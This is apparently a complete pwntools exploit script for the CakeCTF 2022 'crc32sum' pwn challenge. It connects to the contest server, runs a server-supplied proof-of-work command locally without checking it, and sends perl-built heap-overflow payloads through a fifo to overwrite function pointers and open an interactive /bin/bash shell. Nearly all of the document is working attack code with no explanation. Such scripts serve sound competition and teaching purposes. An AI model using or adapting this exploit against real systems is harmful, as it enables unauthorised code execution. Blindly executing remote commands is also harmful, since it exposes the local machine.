from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './crc32sum'
HOST = 'pwn2.2022.cakectf.com'
PORT = 9009

#elf = ELF(TARGET)
def start():
	x = remote (HOST, PORT)
	cmd = x.recvuntil(b'\n', True)
	import subprocess
	cmd = cmd.split(b' ')
	print(f"RUN: {cmd}")
	ret = subprocess.run(cmd, capture_output = True)
	x.sendline((b'').join(ret.stdout.split(b'\n')))
	return x

r = start()

prm = b'$ '
r.sendlineafter(prm, b'mkfifo ./fifo')
r.sendlineafter(prm, b'perl -e \'print "a" x 0x18\' > short')
r.sendlineafter(prm, b'perl -e \'print "a" x 0x30\' > long')
r.sendlineafter(prm, b'perl -e \'print "\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x60\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x60\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x80\\x10\\x40\\x00\\x00\\x00\\x00\\x00" \' > over')
r.sendlineafter(prm, b'perl -e \'print "\\x00" x 0x18 . "\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00" . "a" x 0x408 . "\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x40\\x40\\x00\\x00\\x00\\x00\\x00"\' > fifo &')
r.sendline(b'crc32sum ./short .///////////////////////////////////////////////long ./fifo .///////////////////////////////////////////////over /bin/bash')

r.interactive()
r.close()
